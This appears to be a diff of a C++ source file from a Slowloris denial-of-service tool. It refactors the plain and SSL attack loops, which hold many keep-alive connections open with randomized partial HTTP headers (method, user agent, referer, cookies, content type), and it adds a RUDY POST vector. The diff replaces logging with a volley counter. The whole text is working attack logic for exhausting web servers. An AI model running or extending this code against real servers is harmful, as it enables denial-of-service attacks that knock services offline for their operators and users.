@@ -5,7 +5,7 @@
 
 #include "../Headers/Slowloris.hpp"
 
-void Slowloris::attack(const int *id) {
+void Slowloris::attack() {
     int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
@@ -13,7 +13,6 @@ void Slowloris::attack(const int *id) {
         sockets.emplace_back(0);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             httphdr header{};
             if(!sockets[x]){
@@ -29,21 +28,17 @@ void Slowloris::attack(const int *id) {
                 Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
+                }else{
+                    conf->voly++;
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
 
-void Slowloris::attack_ssl(const int *id) {
+void Slowloris::attack_ssl() {
     int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
@@ -57,7 +52,6 @@ void Slowloris::attack_ssl(const int *id) {
         CTXs.emplace_back(nullptr);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             httphdr header{};
             if(!sockets[x]){
@@ -77,16 +71,12 @@ void Slowloris::attack_ssl(const int *id) {
                 Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
+                }else{
+                    conf->voly++;
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
@@ -99,7 +89,7 @@ void Slowloris::init_header(httphdr *header) {
 
     switch (conf->vector){
         case Config::Slowloris:
-            header->method = Randomizer::random_method();
+            Randomizer::random_method(header->method);
             break;
         case Config::Rudy:
             header->method = "POST";
@@ -108,16 +98,17 @@ void Slowloris::init_header(httphdr *header) {
         default:break;
     }
     if(conf->RandomizeHeader){
-         Randomizer::randomstr(header->location);
+         Randomizer::randomstr(header->path);
     }
-    header->useragent = Randomizer::random_useragent(*(conf->useragents));
-    header->cache_control = Randomizer::random_caching();
-    header->encoding = Randomizer::random_encoding();
-    header->charset = {Randomizer::random_charset(), Randomizer::random_charset()};
-    header->referer = Randomizer::random_referer();
+    Randomizer::random_useragent(*(conf->useragents), header->useragent);
+    Randomizer::random_caching(header->cache_control);
+    Randomizer::random_encoding(header->encoding);
+    Randomizer::random_charset(header->charset[0]);
+    Randomizer::random_charset(header->charset[1]);
+    Randomizer::random_referer(header->referer);
     header->accept = "*/*";
     header->connection_type = "Keep-Alive";
-    header->content_type = Randomizer::random_contenttype();
+    Randomizer::random_contenttype(header->content_type);
     Randomizer::randomstr(header->cookie[0]);
     Randomizer::randomstr(header->cookie[1]);
     header->keep_alive = Randomizer::randomInt(1, 5000);
